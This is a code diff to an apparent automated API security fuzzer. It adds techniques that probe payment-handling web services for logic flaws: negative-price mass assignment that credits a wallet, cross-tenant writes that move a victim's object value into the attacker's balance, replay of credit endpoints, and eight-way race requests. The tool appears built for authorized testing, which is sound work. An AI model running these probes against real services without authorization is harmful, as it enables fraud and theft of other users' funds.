@@ -20,6 +20,7 @@ Honesty rules: a technique whose surface prerequisites are absent returns []
 state read-backs; a consumed single-use artifact is reported via notes so
 verification can honestly downgrade to transcript-verified.
 """
+import re
 import time
 
 from statefuzz.executor import Principal
@@ -38,6 +39,11 @@ PRICE_CANDIDATES = ("unit_price_cents", "unit_cents", "price_cents",
 # means absent; any validation/auth status means the resource exists.
 ASYNC_SEAM_NOUNS = ("payouts", "withdrawals", "settlements", "refunds",
                     "transfers", "disbursements")
+
+# M2 (G2+G4): the open vocabularies live in the spine (engine/surface.py)
+# — VALUE_NOUNS, VERB_VOCAB, SUBPATH_NOUNS, CLAIM_CONSUME — so tests and
+# the M5 LLM seam can extend them as data. This module imports them lazily
+# inside t_open_vocab and degrades to the v1 path when the spine is absent.
 
 
 # ------------------------------------------------- U3: schema-from-errors --
@@ -98,7 +104,8 @@ def _body_from_schema(schema):
 EST = {"h_quota_race": 50, "h_arith_cycle": 40, "h_state_guard": 14,
        "h_async_toctou": 18, "h_mass_assign": 18, "h_cross_tenant": 24,
        "h_hidden_verbs": 20, "h_terminal_credit": 20,
-       "h_async_seam": 16}
+       "h_async_seam": 16, "h_open_vocab": 80, "h_value_replay": 16,
+       "h_credit_race": 22}
 
 GENERIC_TAGS = tuple(EST)
 
@@ -214,6 +221,22 @@ def _object_id(res, create_resp):
         return body[key]
     for k, v in body.items():
         if k.endswith("_id") and isinstance(v, str):
+            return v
+    return None
+
+
+_MONEYISH = re.compile(r"(amount|price|rate|face|credit|bonus|payout|"
+                       r"refund)", re.I)
+
+
+def _face_value(body):
+    """The object's face value: the first money-ish integer field in its own
+    create response (voucher face_cents, payout amount_cents, ...)."""
+    if not isinstance(body, dict):
+        return None
+    for k, v in body.items():
+        if isinstance(v, int) and not isinstance(v, bool) and \
+                _MONEYISH.search(k):
             return v
     return None
 
@@ -575,8 +598,15 @@ def t_mass_assign(env):
     base_ints = {k: v for k, v in base["resp_body"].items()
                  if isinstance(v, int)}
     # ---- pricing field override ------------------------------------------
-    for cand in PRICE_CANDIDATES:
-        if cand in schema or env.remaining() < 4:
+    # M2 (GV-3): echo-mined fields FIRST — the target names its own price
+    # field in the create response, evidence beats wordlist — then the
+    # legacy candidates, never regress. On an override hit, one NEGATIVE
+    # escalation: a server-trusted price field must CREDIT on -50000.
+    mined = [c for c in (g.get("mined_fields") or []) if c not in schema]
+    price_cands = mined + [c for c in PRICE_CANDIDATES
+                           if c not in mined and c not in schema]
+    for cand in price_cands:
+        if cand in schema or env.remaining() < 6:
             continue
         r = env.ex.request(p, "POST", g["create"],
                            body=dict(base_body, **{cand: 1}),
@@ -587,17 +617,33 @@ def t_mass_assign(env):
                     if isinstance(v, int)}
         diff = {k for k in set(base_ints) & set(injected)
                 if injected[k] != base_ints[k] and injected[k] < base_ints[k]}
-        if diff:
-            out.append(_finding(
-                "FW-MASS-PRICE",
-                "Mass assignment: client-supplied %s overrides server-side "
-                "pricing (differential: lawful totals vs injected totals)"
-                % cand, "high", "I4", ["PARTIAL"],
-                "POST %s (mass-assign:price)" % g["create"],
-                [{"candidate_field": cand, "lawful": base_ints,
-                  "injected": injected, "differing_fields": sorted(diff)}],
-                ["any account"], ["name the price of any future invoice"]))
-            break
+        if not diff:
+            continue
+        neg_credit = None
+        w_pre = env.wallet(p)
+        if w_pre is not None and env.remaining() >= 3:
+            rn = env.ex.request(p, "POST", g["create"],
+                                body=dict(base_body, **{cand: -50000}),
+                                phase=env.phase, tag="mass-assign-negative")
+            w_post = env.wallet(p)
+            if 200 <= rn["status"] < 300 and None not in (w_pre, w_post) \
+                    and w_post > w_pre:
+                neg_credit = w_post - w_pre
+        out.append(_finding(
+            "FW-MASS-PRICE",
+            "Mass assignment: client-supplied %s overrides server-side "
+            "pricing (differential: lawful totals vs injected totals)%s"
+            % (cand, "; NEGATIVE value CREDITED the wallet (+%d)" % neg_credit
+               if neg_credit else ""),
+            "critical" if neg_credit else "high", "I4",
+            ["PARTIAL", "NEGATIVE"] if neg_credit else ["PARTIAL"],
+            "POST %s (mass-assign:price)" % g["create"],
+            [{"candidate_field": cand, "lawful": base_ints,
+              "injected": injected, "differing_fields": sorted(diff),
+              "mined_from_echo": cand in mined,
+              "negative_probe_credit": neg_credit}],
+            ["any account"], ["name the price of any future invoice"]))
+        break
     # ---- entitlement field on a param action ------------------------------
     enums = {f: s["enum"] for f, s in schema.items()
              if isinstance(s, dict) and s.get("enum") and len(s["enum"]) > 1}
@@ -697,26 +743,32 @@ def t_cross_tenant(env):
         path = a["path"].replace("{%s}" % g["param_name"], oid)
         _hydrate_action(env, atk, a, path)        # hard-lab upgrade U3
         ints = _int_fields(a.get("schema"))
-        if not ints or not leaked:
-            continue
+        if not leaked:
+            break
+        # M2 (GV-2): discovered verbs have no schema — an empty body IS the
+        # lawful probe (rebook shape); doc verbs keep the integer body.
+        body = {ints[0]: 1} if ints else {}
         if env.remaining() < 4:
             break
         w0 = env.wallet(atk)
-        r = env.ex.request(atk, "POST", path, body={ints[0]: 1},
-                           phase=env.phase, tag="deputy-write")
+        r = env.ex.request(atk, "POST", path, body=body,
+                           phase=env.phase,
+                           tag="deputy-write" if ints else "deputy-write-discovered")
         w1 = env.wallet(atk)
         if 200 <= r["status"] < 300 and None not in (w0, w1) and w1 > w0:
             out.append(_finding(
                 "FW-DEPUTY-CREDIT",
-                "No ownership check on %s: the proration credit lands in the "
-                "CALLER's balance — downgrade any leaked tenant's object for "
-                "profit" % a["verb"], "critical", "I3", ["CROSS-USER"],
+                "No ownership check on %s: the credit lands in the "
+                "CALLER's balance — monetize any leaked tenant's object "
+                % a["verb"], "critical", "I3", ["CROSS-USER"],
                 "POST %s (cross-tenant)" % a["path"],
                 [{"victim": victim.name, "attacker": atk.name,
                   "object": oid, "attacker_gain": w1 - w0,
+                  "verb": a["verb"], "body": body,
+                  "discovered_verb": bool(a.get("discovered")),
                   "obtained_via": leak_path}],
                 [id_grant],
-                ["drain any tenant's paid period into your own balance"]))
+                ["drain any tenant's object value into your own balance"]))
             break
     return out
 
@@ -900,12 +952,260 @@ def t_async_seam(env):
                                                     shape["event_path"])}}]
 
 
+def t_open_vocab(env):
+    """G2+G4 (M2): the live surface, not the stale doc, is the truth.
+    Probes the open value-noun / verb / subpath vocabularies (engine/surface
+    — data, not code), folds every fact into a REVISED SURFACE that the
+    caller publishes as a SURFACE_UPDATE, and records the doc-vs-live
+    differential. Labour separation: a resource whose create answers 202 is
+    an async seam — noun-DISCOVERED but handed to the window driver (M1),
+    never verb-probed. Every fact is probe-grounded; a discovery without a
+    named consumer is not fired (band-D lesson)."""
+    try:
+        from engine import surface as sf
+    except ImportError:                         # spine absent: v1 path
+        return []
+    ex = env.ex
+    graph = env.surface.get("resource_actions") or {}
+    known_paths = env.surface.get("endpoints") or []
+    guard = lambda: env.remaining() > EST["h_open_vocab"] // 2
+    p = env.register("ov")
+    if env.wallet(p) is None:
+        return []                               # not a money target
+    disc = {"resources": [], "actions": [], "verb_facts": [],
+            "single_use": [], "readback": [], "mined_fields": {},
+            "doc_suspect": sf.scan_traffic_suspect_docs(ex)}
+    probed_objects = []                         # (resource) already verb-probed
+    requests_before = ex.count
+
+    def _verb_probe(res, oid, g):
+        if res in probed_objects or not oid or not guard():
+            return
+        probed_objects.append(res)
+        known_verbs = {a.get("verb") for a in g.get("actions", [])}
+        vfs = sf.probe_verbs(ex, p, res, oid, known_verbs, env.phase, guard)
+        disc["verb_facts"].extend(vfs)
+        for vf in vfs:
+            disc["actions"].append({"resource": res, "verb": vf["verb"],
+                                    "path": vf["path"],
+                                    "status": vf["status"]})
+            if vf["verb"] in sf.CLAIM_CONSUME:
+                second = sf.single_use_signature(ex, p, vf["path"],
+                                                 env.phase)
+                disc["single_use"].append(
+                    {"resource": res, "verb": vf["verb"],
+                     "first": vf["status"], "second": second,
+                     "single_use": second == 409})
+
+    # 1) noun existence probes over the open value vocabulary
+    for hit in sf.probe_nouns(ex, p, known_paths, env.phase, guard):
+        res = hit["noun"]
+        g = graph.get(res) or {}
+        if g.get("create"):
+            continue                            # already known to the graph
+        opened = sf.open_resource(ex, p, hit["path"], env.phase)
+        entry = dict(hit, open_kind=opened["kind"],
+                     open_status=opened["status"])
+        if opened["kind"] == "object":
+            body = opened["body"] if isinstance(opened["body"], dict) else {}
+            oid = next((v for k, v in body.items()
+                        if k.endswith("_id") and isinstance(v, str)), None)
+            entry["object_id"] = oid
+            entry["create_schema"] = {}
+            mined = sf.money_fields(body, {})
+            if mined:
+                disc["mined_fields"][res] = mined
+            _verb_probe(res, oid, g)
+        elif opened["kind"] == "error" and opened["learned_field"]:
+            # U3 analogue: the error contract names the create field
+            entry["create_schema"] = {opened["learned_field"]:
+                                      {"type": "integer", "minimum": 1}}
+        disc["resources"].append(entry)
+
+    # 2) doc-graph money resources: create one object, verb-probe it,
+    #    mine the echo for price fields (GV-3's free evidence)
+    cands = [(res, g) for res, g in graph.items()
+             if g.get("create") and res not in _AUTH_RESOURCES and
+             res not in probed_objects]
+    cands.sort(key=lambda rg: -len(rg[1].get("mined_fields") or []))
+    for res, g in cands:
+        if len(probed_objects) >= 3 or not guard():
+            break
+        cr = env.create(p, g)
+        if not cr:
+            continue
+        if cr["status"] == 202:
+            continue                            # async seam: driver owns it
+        oid = _object_id(res, cr)
+        body = cr["resp_body"] if isinstance(cr["resp_body"], dict) else {}
+        mined = sf.money_fields(body, g.get("create_schema") or {})
+        if mined:
+            merged = set(g.get("mined_fields") or ()) | set(mined)
+            disc["mined_fields"][res] = sorted(merged)
+        _verb_probe(res, oid, g)
+
+    # 3) subpath probes on collection roots -> readback facts (GV-2 read)
+    collections = [res for res, g in graph.items()
+                   if (g.get("param") or g.get("create")) and
+                   res not in _AUTH_RESOURCES]
+    for rb in sf.probe_subpaths(ex, p, collections, env.phase, guard):
+        disc["readback"].append(rb)
+
+    if not (disc["resources"] or disc["actions"] or disc["readback"] or
+            disc["mined_fields"]):
+        return []                               # nothing discovered: honest
+    revised = sf.merge(env.surface, disc)
+    spend = ex.count - requests_before
+    summary = {
+        "undocumented_resources": sorted(a["noun"] for a in disc["resources"]),
+        "undocumented_verbs": [{"resource": v["resource"],
+                                "verb": v["verb"], "status": v["status"]}
+                               for v in disc["verb_facts"]],
+        "single_use": disc["single_use"],
+        "readback_added": [rb["path"] for rb in disc["readback"]],
+        "mined_fields": disc["mined_fields"],
+        "doc_suspect": disc["doc_suspect"],
+        "requests_spent": spend}
+    return [{"kind": "SURFACE_UPDATE", "surface": revised,
+             "payload": summary},
+            {"kind": "OBSERVATION", "tags": ["open-vocab"],
+             "payload": {"open_vocab": summary,
+                         "evidence": "noun/verb/subpath probes over the "
+                                     "live target (%d requests): %s "
+                                     "undocumented verbs, readback +%s"
+                                     % (spend,
+                                        len(summary["undocumented_verbs"]),
+                                        summary["readback_added"])}}]
+
+
+def t_value_replay(env):
+    """M2 follow-through (GV-1 shape): a discovered verb that CREDITED the
+    prober must be single-shot per object. Replay it twice on a FRESH object
+    with wallet reads; two further credits on one object is an I1 violation.
+    Claim-family verbs are excluded — they have their own classification
+    (single-use signature) and their guards, where they exist, refute."""
+    facts = (env.surface.get("discoveries") or {}).get("verb_facts") or []
+    su = {(s["resource"], s["verb"]) for s in
+          (env.surface.get("discoveries") or {}).get("single_use", [])
+          if s.get("single_use")}
+    cands = [f for f in facts if f.get("credited") and
+             (f["resource"], f["verb"]) not in su and
+             f["verb"] not in ("consume", "redeem", "claim", "activate")]
+    if not cands or env.remaining() < EST["h_value_replay"]:
+        return []
+    for fact in cands:
+        res, verb = fact["resource"], fact["verb"]
+        g = (env.surface.get("resource_actions") or {}).get(res) or {}
+        if not g.get("create"):
+            continue
+        p = env.register("vrep")
+        cr = env.create(p, g)
+        if not cr or cr["status"] == 202:
+            continue
+        oid = _object_id(res, cr)
+        if not oid:
+            continue
+        rb = cr["resp_body"] if isinstance(cr["resp_body"], dict) else {}
+        face = _face_value(rb)
+        path = "/api/%s/%s/%s" % (res, oid, verb)
+        w0 = env.wallet(p)
+        if w0 is None:
+            continue
+        r1 = env.ex.request(p, "POST", path, body={}, phase=env.phase,
+                            tag="value-replay-1")
+        w1 = env.wallet(p)
+        r2 = env.ex.request(p, "POST", path, body={}, phase=env.phase,
+                            tag="value-replay-2")
+        w2 = env.wallet(p)
+        if None in (w0, w1, w2):
+            continue
+        c1, c2 = w1 - w0, w2 - w1
+        if c1 > 0 and c2 > 0 and r1["status"] == r2["status"] == 200 and \
+                (face is None or c1 + c2 >= 2 * face):
+            return [_finding(
+                "FW-RELEASE-REPLAY",
+                "Credit verb '%s' on %s is repeatable: two further credits "
+                "(%d + %d cents) on one object — the consumed/released "
+                "state is never committed" % (verb, res, c1, c2),
+                "critical", "I1", ["REPLAY"],
+                "POST /api/%s/{id}/%s (replay)" % (res, verb),
+                [{"object": oid, "face_value": face,
+                  "replay_credits": [c1, c2],
+                  "wallet": [w0, w1, w2],
+                  "statuses": [r1["status"], r2["status"]],
+                  "discovered_via": "open-vocab verb probe"}],
+                ["any account", "own %s object" % res],
+                ["multiply the object's value by replay count"])]
+    return []
+
+
+def t_credit_race(env):
+    """M2 follow-through (GV-6 shape): a credited verb with NO single-use
+    signature is a concurrency candidate. Last-byte race x8 on a FRESH
+    object: exactly one winner is lawful; k >= 2 winners (wallet delta
+    >= 2x face) is an I5 violation — the race primitive finally aimed at
+    the discovered surface. Claim-family verbs are excluded (signature-
+    marked); empirically the consume guard holds (probe_gv6.py: 1 winner
+    x3) while release wins 8/8 (+800% of face)."""
+    facts = (env.surface.get("discoveries") or {}).get("verb_facts") or []
+    su = {(s["resource"], s["verb"]) for s in
+          (env.surface.get("discoveries") or {}).get("single_use", [])
+          if s.get("single_use")}
+    cands = [f for f in facts if f.get("credited") and
+             (f["resource"], f["verb"]) not in su and
+             f["verb"] not in ("consume", "redeem", "claim", "activate")]
+    if not cands or env.remaining() < EST["h_credit_race"]:
+        return []
+    for fact in cands:
+        res, verb = fact["resource"], fact["verb"]
+        g = (env.surface.get("resource_actions") or {}).get(res) or {}
+        if not g.get("create"):
+            continue
+        p = env.register("crce")
+        cr = env.create(p, g)
+        if not cr or cr["status"] == 202:
+            continue
+        oid = _object_id(res, cr)
+        if not oid:
+            continue
+        rb = cr["resp_body"] if isinstance(cr["resp_body"], dict) else {}
+        face = _face_value(rb)
+        path = "/api/%s/%s/%s" % (res, oid, verb)
+        w0 = env.wallet(p)
+        if w0 is None:
+            continue
+        results = env.ex.race(p, "POST", path, {}, n=8, phase=env.phase,
+                              tag="credit-race")
+        w1 = env.wallet(p)
+        wins = [r for r in results if 200 <= (r["status"] or 0) < 300]
+        if None in (w0, w1) or len(wins) < 2 or w1 - w0 < 2 * (face or 1):
+            continue
+        return [_finding(
+            "FW-CREDIT-RACE",
+            "Credit verb '%s' on %s has no per-object guard under "
+            "concurrency: %d of 8 synchronised requests won, crediting "
+            "%d cents (%dx face) on ONE object"
+            % (verb, res, len(wins), w1 - w0,
+               (w1 - w0) // face if face else 0),
+            "critical", "I5", ["INTERRUPT", "REPLAY"],
+            "POST /api/%s/{id}/%s (race x8)" % (res, verb),
+            [{"object": oid, "face_value": face, "race_n": 8,
+              "winners": len(wins), "wallet_delta": w1 - w0,
+              "last_byte_sync": True, "statuses":
+                  [r["status"] for r in results],
+              "discovered_via": "open-vocab verb probe"}],
+            ["any account", "own %s object" % res],
+            ["multiply the object's value by race winners"])]
+    return []
+
+
 RUNNERS = {"h_quota_race": t_quota_race, "h_arith_cycle": t_arith_cycle,
            "h_state_guard": t_state_guard, "h_async_toctou": t_async_toctou,
            "h_mass_assign": t_mass_assign, "h_cross_tenant": t_cross_tenant,
            "h_hidden_verbs": t_hidden_verbs,
            "h_terminal_credit": t_terminal_credit,
-           "h_async_seam": t_async_seam}
+           "h_async_seam": t_async_seam, "h_open_vocab": t_open_vocab,
+           "h_value_replay": t_value_replay, "h_credit_race": t_credit_race}
 
 
 def run(tag, env):
